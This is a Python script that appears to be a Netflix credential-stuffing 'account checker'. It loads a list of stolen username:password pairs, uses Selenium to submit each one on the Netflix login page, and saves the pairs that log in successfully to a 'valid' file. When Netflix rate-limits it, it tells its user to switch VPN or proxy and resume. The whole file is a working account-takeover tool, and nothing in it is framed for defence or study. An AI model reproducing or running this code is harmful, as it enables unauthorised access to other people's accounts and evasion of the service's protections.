import logging
import time
import requests
import os
import sys
from pathlib import Path
from header import title
from header import user_options
from countries import find_IP
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains


def splitter():
    # Combo Splitter
    title()
    users = []
    passwords = []
    try:
        with open('netflix', 'r') as net:
            for line in net.readlines():
                users.append(line.split(":")[0])
                passwords.append(line.split(":")[1].split(" ")[0])
            print("\n\033[38;5;7mUser : password combinations sorted.\n\nYou can now run the checker.")
            input("\n\nPress Enter...")
        return users, passwords
    except IndexError:
        print(
            "\n\n\033[38;5;255mThere is something wrong with the combolist.\nCheck for extra spaces, extra characters\nOr anything else that shouldn't be there.\nEnding.")
        exit()
    except FileNotFoundError:
        print(
            "\n\n\033[38;5;255mCombo-list not found. Place it in the main directory,\nand make sure it's named 'netflix' (no file extension, or capitalization).\nEnding.")
        exit()


details = [find_IP()[0], find_IP()[1], find_IP()[2]]
counter = 0
hits = 0
updated_list = []
files = []
resume_flag = False
clear_page = 0
directory = str(Path(__file__).parent)

for file_ in os.listdir(directory):
    files.append(file_)

page = "https://www.netflix.com/login"
while True:
    logging.getLogger().setLevel(logging.CRITICAL)
    counter = 0
    title()
    print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
    user_options()
    options = input("Pick an option: ")
    while True:
        if options == "1":
            #Account Checker
            combos = splitter()
            user = combos[0]
            passw = combos[1]
            title()
            if resume_flag:
                print("\033[38;5;7m\nResume file found. Resuming from given combo.")
            print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
            while counter < len(user):
                if len(user) == 0:
                    print("\n\033[38;5;226mNo Accounts for current country.\n")
                    break
                try:
                    print(
                        "\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(
                            str(counter), user[counter], passw[counter].strip()), end='')
                    browser_options = Options()
                    browser_options.add_argument(
                        'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
                    browser = webdriver.Chrome(options=browser_options)
                    browser.set_window_size(500, 700)
                    browser.get(page)
                    time.sleep(0.7)
                    if browser.find_elements(By.XPATH, '//button[@id="onetrust-reject-all-handler"]'):
                        button = browser.find_element(By.XPATH, '//button[@id="onetrust-reject-all-handler"]')
                        button.click()
                        time.sleep(0.7)
                    if browser.find_elements(By.XPATH, '//button[@data-uia="login-toggle-button"]'):
                        if browser.find_element(By.XPATH,
                                                '//button[@data-uia="login-toggle-button"]').text == "Use password":
                            button = browser.find_element(By.XPATH,
                                                          '//*[@id="appMountPoint"]/div/div/div[2]/div/form/button[2]')
                            button.click()
                    time.sleep(0.7)
                    login = browser.find_element(By.XPATH, '//input[@name="userLoginId"]')
                    password = browser.find_element(By.XPATH, '//input[@name="password"]')
                    login.send_keys(user[counter])
                    time.sleep(0.7)
                    password.send_keys(passw[counter].strip())
                    time.sleep(0.7)
                    action = ActionChains(browser)
                    password.send_keys(Keys.TAB)
                    password.send_keys(Keys.ENTER)
                    time.sleep(0.7)
                    if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH,
                                                                                                      '//div[@id="loginErrorMessage"]'):
                        print("\033[38;5;196m Invalid Account", end='')
                    if browser.current_url == 'https://www.netflix.com/browse' or browser.find_elements(By.XPATH,
                                                                                                        '//div[@class="profiles-gate-container"]'):
                        print("\033[38;5;46m Valid Account - Stored", end='')
                        hits += 1
                        with open('valid', 'a') as valid:
                            valid.write("{}:{}\n".format(user[counter], passw[counter]))
                except:
                    request = requests.get(page)
                    if request.status_code == 403:
                        print(
                            "\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n")
                        with open('resume', 'a') as resume:
                            for line in range(len(updated_list)):
                                resume.write("{}\n".format(updated_list[line].strip()))
                        resume.close()
                        exit()
                if len(updated_list) > 1:
                    del updated_list[0]
                if clear_page > 10:
                    title()
                    print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
                    clear_page = 0
                time.sleep(1)
                counter += 1
                clear_page += 1
                browser.close()
                sys.stdout.write("\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8" % (
                    hits, str(counter), str(len(user))))
                sys.stdout.flush()

            print("\n\033[38;5;226mAll done.")
            input("\n\033[38;5;226mPress Enter.")
            if resume_flag:
                os.remove('resume')
            break
        if options == "2":
            #Exit
            exit()
        else:
            break
